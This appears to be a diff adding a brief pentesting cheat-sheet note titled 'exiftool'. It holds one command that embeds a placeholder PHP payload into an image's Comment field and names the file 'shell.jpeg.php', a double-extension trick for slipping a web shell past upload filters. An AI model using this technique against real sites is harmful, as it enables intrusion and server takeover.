@@ -1,0 +1,4 @@
+% exiftool
+
+# embed php into image
+exiftool -Comment="<PHP_PAYLOAD>" shell.jpeg.php
